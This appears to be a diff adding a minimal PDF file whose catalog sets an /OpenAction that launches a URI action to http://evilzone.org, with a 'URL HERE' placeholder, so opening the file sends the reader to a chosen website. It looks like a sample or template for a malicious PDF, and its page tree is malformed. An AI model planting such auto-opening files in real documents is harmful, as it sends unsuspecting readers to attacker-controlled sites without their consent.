@@ -1,0 +1,22 @@
+%PDF-1.7
+trailer
+<<
+/Root 1 0 R
+>>
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 2 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Action
+/S /URI
+/URI (http://evilzone.org) // URL HERE
+>>
+endobj
+
+%%EOF
